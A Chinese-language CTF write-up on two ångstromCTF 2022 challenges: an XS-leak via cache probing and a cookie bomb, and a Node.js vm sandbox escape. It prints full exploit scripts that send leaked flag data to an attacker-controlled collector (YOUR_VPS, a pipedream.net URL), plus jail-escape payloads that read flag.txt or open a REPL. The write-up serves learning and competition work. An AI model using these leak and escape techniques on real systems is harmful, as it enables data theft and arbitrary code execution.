---
title: ångstromCTF 2022 筆記
catalog: true
date: 2022-05-05 20:36:04
tags: [Security]
categories: [Security]
---

<img src="/img/angstrom-ctf-2022-writeup/cover.png" style="display:none">

這次的比賽我第一天有事沒辦法參加，第二天參與時發現 web 的題目被隊友解的差不多了，所以有滿多題目沒去看的。

因為我滿愛 JavaScript 跟 XS-leak，所以這篇只會記兩題我最有興趣的：

1. web/Sustenance
2. misc/CaaSio PSE

（之後有機會再補另一題 DOMPurify + marked bypass 的 XSS）

<!-- more -->

## web/Sustenance

這是一個功能非常簡單的 App：

``` js
const express = require("express");
const cookieParser = require("cookie-parser");
const path = require("path");

const app = express();
app.use(express.urlencoded({ extended: false }));

// environment config
const port = Number(process.env.PORT) || 8080;
const adminSecret = process.env.ADMIN_SECRET || "secretpw";
const flag =
    process.env.FLAG ||
    "actf{someone_is_going_to_submit_this_out_of_desperation}";

function queryMiddleware(req, res, next) {
    res.locals.search =
        req.cookies.search || "the quick brown fox jumps over the lazy dog";
    // admin is a cool kid
    if (req.cookies.admin === adminSecret) {
        res.locals.search = flag;
    }
    next();
}

app.use(cookieParser());

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/s", (req, res) => {
    if (req.body.search) {
        for (const [name, val] of Object.entries(req.body)) {
            res.cookie(name, val, { httpOnly: true });
        }
    }
    res.redirect("/");
});

app.get("/q", queryMiddleware, (req, res) => {
    const query = req.query.q || "h"; // h
    let status;
    if (res.locals.search.includes(query)) {
        status =
            "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
    } else {
        status = "failed";
    }
    res.redirect(
        "/?m=" +
            encodeURIComponent(
                `your search that took place at ${Date.now()} has ${status}`
            )
    );
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
```

你可以設置任意 cookie，也可以搜尋某些字元是否存在於 flag 當中，而這題沒有 XSS 的點又有搜尋功能，因此顯然是 XS-leak。

既然是 XS-leak，就要觀察「有搜尋到」跟「沒搜尋到」的差別是什麼，搜尋的 query 長這樣：`/q?q=actf`，如果有搜尋到的話，會導到 `/?m=your search...at 1651732982748 has success....`，沒搜尋到的話會導到 `/?m=your search...ar 1651732982748 has failed`

而 index.html 只會把網址列上 `m` 的內容 render 到畫面上，因此成功跟失敗的差異有兩個：

1. 網址不同
2. 頁面的內容不同

一開始我嘗試的方向是 cache probing，因為有造訪過的頁面會存進 disk cache，所以只要用 `fetch + force-cache` 的方式，就可以根據時間差來判斷是否在 cache 內。至於網址列上的 timestamp，直接設個爆搜的範圍就好，例如說 1~1000 之類的。

因為預設 SameSite=Lax 的關係，所以搜尋的時候只能用 `window.open` 這種 top-level navigation，否則 cookie 帶不出去。

而最大的問題是 Chrome 現在有 [cache partitioning](https://developer.chrome.com/blog/http-cache-partitioning/)，新開的頁面的 cache key 是：`(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`，但假設我自己開個 ngrok 裡面用 fetch，cache key 會是：`(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`，cache key 是不同的，所以抓不到 cache。

我跟隊友也有討論過既然可以設定 cookie，那是不是可以利用 [cookie bomb](https://blog.huli.tw/2021/07/10/cookie-bomb/) 來做事，但討論過後我們也沒找出什麼方法。

接著我嘗試利用 [pbctf 2021 Vault](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html) 中的方法，用 `a:visited` 去洩露 history，改了一下上面這篇的 POC 以後可以動，但丟去 admin bot 發現無效。自己在本機測了一下，發現應該是因為 headless 的關係，不管怎樣 render 的時間都是 16ms。

試到沒什麼招了以後，[lebr0nli](https://lebr0nli.github.io/blog/) 貼了一個利用 cache probing 的 POC，是從 [maple 的 writeup](https://blog.maple3142.net/2021/10/11/pbctf-2021-writeups/#vault) 中看來的，而重點是「這個 POC 可以利用別的題目，藉此跑在 same site 上面」，例如說另一題的網址是 `https://xtra-salty-sardines.web.actf.co/`，從這邊用 fetch 的話，cache key 也會是 `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`，因為 cache key 只看 eTLD+1，所以 same site 的網站，cache key 也會一樣。

但他碰到的問題是 local 可以跑，可是在 remote 上面怎麼樣都是 false positive。於是我照著他的 POC 改了一下，試著多回傳一些數字，發現問題出在 server 跑得異常的快。舉例來說，有 cache 的要 3ms，沒有 cache 的也只要 5ms，相差極少，連 timestamp 的部分也是，大概是 `window.open` 之後 10ms 以內。

因此我修改了一下程式碼，直接在遠端計算有 cache 的平均時間，就順利 leak 出了 flag，程式碼如下：

https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722

``` js
// to hang the connection
fetch('https://deelay.me/20000/https://example.com')

// NOTE: we will calculate this baseline before doing the attack
var baseLine = 3.2
const sleep = ms => new Promise((resolve) => setTimeout(resolve, ms))

go()
async function go() {
  await calculateBaseline()
  main()

  async function calculateBaseline() {
    var m = Math.random()
    let win = window.open('https://sustenance.web.actf.co/?m=cached_' + m)
    
    // NOTE: this number can be decreased by detecting window load
    await sleep(500)
    win.close()
    let total = 0
    for(let i=1; i<=5; i++) {
      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=cached_' + m)
      total += ts
      report(`Cached time, round: ${i}, ${ts}ms`)
    }
    // NOTE: 0.5 is just a random guess
    baseLine = (total/5) + 0.5
    report(`Baseline: ${baseLine}`)
    
    // NOTE: adjust baseline, should not be more than 3 ms based on previous testing
    if (baseLine > 3) {
      baseLine = 3
    }
    for(let i=1; i<=3; i++) {
      let ts = await getLoadTime('https://sustenance.web.actf.co/?m=not_cached_' + m)
      report(`Not Cached time, round: ${i}, ${ts}ms`)
    }
  }

  // NOTE: server is quite fast so no need to set timeout
  async function getLoadTime(url) {
    const start = performance.now()
    await fetch(url, { cache: 'force-cache', mode: 'no-cors' })
    return performance.now() - start
  }

  function genSucceedUrl(t) {
    let ft = t + ''
    while(ft.length < 13) {
      ft += '0'
    }
    const status = "succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance";
    return 'https://sustenance.web.actf.co/?m=' + encodeURIComponent(`your search that took place at ${ft} has ${status}`);
  }

  async function isCached(str) {
    let start = +new Date()
    let win = window.open(`https://sustenance.web.actf.co/q?q=` + encodeURIComponent(str))
    await sleep(500)
    win.close()
    
    // NOTE: base on the data collected, i should be 1~20, pretty small number
    for(let i=1; i<=30; i++) {
      const url = genSucceedUrl(start + i)
      let loadTime = await getLoadTime(url)
      if (loadTime <= baseLine) {
        
        // NOTE: check again to see if it really meets the condition
        let total = 0
        for(let j=1; j<=3; j++) {
          total += await getLoadTime(url)
        }
        total/=3
        if (total <= baseLine) {
          report(`isCached success, str=${str}, i=${i}, start=${start}, total=${total}`)
          return true
        }
      }
    }
    return false
  }

  async function main() {
    let flag = 'actf{yummy_'
    
    // NOTE: we can leak the charset first to speed up the process
    let chars = 'acefsmntuy_}'.split('')
    while(flag[flag.length - 1] !== '}') {
      for(let char of chars) {
        report('trying:'  + flag + char)
        if (await isCached(flag + char)) {
          flag += char
          report('flag:' + flag)
          break
        }
      }
    }
  }

  async function report(data) {
    console.log(data)
    // TODO: change to your VPS
    return fetch('https://YOUR_VPS/', { method: 'POST', body: data, mode: 'no-cors' }).catch(err => err);
  }
}
```

我們可以先 leak 出 charset，速度就會快很多。上面還有些小地方可以再調整的，整體速度應該會再更快。

後來隊友也有貼了另外一篇 writeup：[UIUCTF 2021- yana](https://ctf.zeyu2001.com/2021/uiuctf-2021/yana#this-shouldnt-have-worked)，從中得知 headless chrome 目前是沒有 cache partitioning 的。

我自己實際測了一下，發現到現在還是這樣，所以這題其實不需要借用其他題目，自己架個 ngrok 就可以搞定。

### 預期解

預期解應該就是我上面說過的 cookie bomb，先設置一大堆 cookie，然後利用成功跟失敗的 url 網址不同這個特性，如果成功的話 url 會比較長，request 就會太大，server 就會回錯誤，失敗的話就不會有事。

底下的 script 來自 Strellic，一樣要借用其他題目來跑在 same site 上面：

``` html
<>'";<form action='https://sustenance.web.actf.co/s' method=POST><input id=f /><input name=search value=a /></form>
<script>
    const $ = document.querySelector.bind(document);
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    let i = 0;
    const stuff = async (len=3500) => {
        let name = Math.random();
        $("form").target = name;
        let w = window.open('', name);
        $("#f").value = "_".repeat(len);
        $("#f").name = i++;
        $("form").submit();
        await sleep(100);
    };
    const isError = async (url) => {
        return new Promise(r => {
            let script = document.createElement('script');
            script.src = url;
            script.onload = () => r(false);
            script.onerror = () => r(true);
            document.head.appendChild(script);
        });
    }
    const search = (query) => {
        return isError("https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query));
    };
    const alphabet = "etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ";
    const url = "//en4u1nbmyeahu.x.pipedream.net/";
    let known = "actf{";
    window.onload = async () => {
        navigator.sendBeacon(url + "?load");
        await Promise.all([stuff(), stuff(), stuff(), stuff()]);
        await stuff(1600);
        navigator.sendBeacon(url + "?go");
        while (true) {
            for (let c of alphabet) {
                let query = known + c;
                if (await search(query)) {
                    navigator.sendBeacon(url, query);
                    known += c;
                    break;
                }
            }
        }
    };
</script>
```

這邊有幾個細節要知道：

1. request 太大的話 server 會回錯誤
2. 因為是 same site，所以 `<script>` 發 request 時會自動帶 cookie
3. 利用 script 的 event 來偵測 http status code 是不是成功

當初卡關是因為：

1. 沒想到可以利用其他題目來繞過 same site cookie
2. 沒注意到 request URL 也包含在長度裡面，只想到 header/body

## misc/CaaSio PSE

這題是限制很嚴格的 js jail，題目長這樣：

``` js
#!/usr/local/bin/node

// flag in ./flag.txt

const vm = require("vm");
const readline = require("readline");

const interface = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

interface.question(
    "Welcome to CaaSio: Please Stop Edition! Enter your calculation:\n",
    function (input) {
        interface.close();
        if (
            input.length < 215 &&
            /^[\x20-\x7e]+$/.test(input) &&
            !/[.\[\]{}\s;`'"\\_<>?:]/.test(input) &&
            !input.toLowerCase().includes("import")
        ) {
            try {
                const val = vm.runInNewContext(input, {});
                console.log("Result:");
                console.log(val);
                console.log(
                    "See, isn't the calculator so much nicer when you're not trying to hack it?"
                );
            } catch (e) {
                console.log("your tried");
            }
        } else {
            console.log(
                "Third time really is the charm! I've finally created an unhackable system!"
            );
        }
    }
);
```

VM bypass 的部分很簡單，可以用 `this.constructor.constructor('return ...')()` 來搞定，但是難點在於限制的字元很多，字串相關的都不給用，`.` 跟 `[]` 也不行，`{};>` 也不行，卡了很多東西。嘗試一陣子之後想起用 [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) 也可以來存取屬性，像這樣：

``` js
with(console)log(123)
```

字串的部分可以用 regexp 來繞，像這樣：`/string/.source`。

做一做有想到是不是可以用 decodeURI 來繞一些字元，不過沒有仔細想，賽後發現很多人用這招來解，像是 lebr0nli 的：

``` js
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
``` 

regexp 如果直接變成字串，前後會有兩個 `/`，只要在 regexp 裡面加上 `/\n`，就會跟前面的結合變成這樣：

``` js
//
your_code_here
```

概念跟我之前出的 [XSS challenge](https://blog.huli.tw/2022/02/14/en/intigriti-0222-author-writeup/) 其實滿類似的。

總之，我最後組出的 payload 框架長這樣：

``` js
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
```

只要把 `console.log(1)` 改成想跑的程式碼就行了，而我們想執行的程式碼是：

``` js
return String(process.mainModule.require('fs').readFileSync('flag.txt'))
```

轉成字串那個步驟不一定需要，只是讓 flag 可讀性更好而已。


接著可以利用 `with` 把上面的程式碼轉成：

``` js
with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
```

由於不能有單引號，所以我們可以先把那些變成變數比較好讀，之後再來看怎麼拿掉：

``` js
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
```

現在只需要產生出字串就好，可以用 `String.fromCharCode` 達到這件事：

``` js
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)with(require(k))return(String(readFileSync(n))) // 這邊跟上面都一樣
```

因此最後的 payload 就是把這段程式碼跟剛剛的框架拼在一起，我稍微排版一下比較好讀：

``` js
with(
  /with(String)
    with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
      with(mainModule)
        with(require(k))
          return(String(readFileSync(n)))
  /)
with(this)
  with(constructor)
    constructor(source)()
```

看了 [Maple](https://blog.maple3142.net/2022/05/03/angstromctf-2022-writeups/) 的 payload 才發現 with 巢狀會被蓋掉的方法可以用 `with(a=source,/b/)` 繞掉，舉例來說：

``` js
with(/a/)with(/b/)console.log(source)
```

你只能拿到 `/b/.source`，拿不到 a 的，因為屬性同樣名稱。所以你可以這樣寫：

``` js
with(/a/)with(a=source,/b/)console.log(a,source)
```

直接在第二個 with 裡面先用 `a=source` 去拿到上一個 with 的屬性。

除了 with 以外，還利用了 `require('repl').start()` 這個神奇的內建模組，簡單來說就是開啟 repl 模式，之後你想執行什麼就執行甚麼，可以擺脫字元的限制。底下是他的 payload：


``` js
with(/with(process)with(mainModule)with(require(x))start()/)
  with(s1=source,/x/)
  with(s2=source,/repl/)
  with(s3=source,this)
    with(constructor)
      constructor(s2,s1)(s3)
```

作者的解法是這樣，沒有用到 regexp：

``` js
with(String)
  with(f=fromCharCode,this)
    with(constructor)
      with(constructor(f(r=114,101,t=116,117,r,110,32,112,r,111,99,101,s=115,s))())
        with(mainModule)
          with(require(f(102,s)))
            readFileSync(f(102,108,97,103,46,t,120,t))
```

這個解法利用了一堆暫存變數來節省字元，這招也很聰明，結合了 Maple 的解法的話就變成：

``` js
with(String)
  with(f=fromCharCode,this)
    with(constructor)
      with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,99,e,s=115,s))())
        with(mainModule)
          with(require(f(r,e,p,108)))
            start()
```

然後雖然大家很愛用 `this.constructor.constructor`，但理解原理就會知道第一個 `constructor` 只是為了拿到 function，可以找一下 object 上有哪些東西：

``` js
for(let key of Object.getOwnPropertyNames((obj={}).__proto__)) {
  if (typeof obj[key] === 'function') {
    console.log(key)
  }
}
```

最短的是 `valueOf`，所以可以再縮成這樣：

``` js
with(String)with(f=fromCharCode,this)with(valueOf)with(constructor(f(r=114,e=101,116,117,r,110,32,p=112,r,111,99,e,s=115,s))())with(mainModule)with(require(f(r,e,p,108)))start()
```

總共 177 個字元。

如果結合 Discord 中 fredd 的解法，有用到 regexp 的我找到最短的是這樣，115 個字：

``` js
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))
```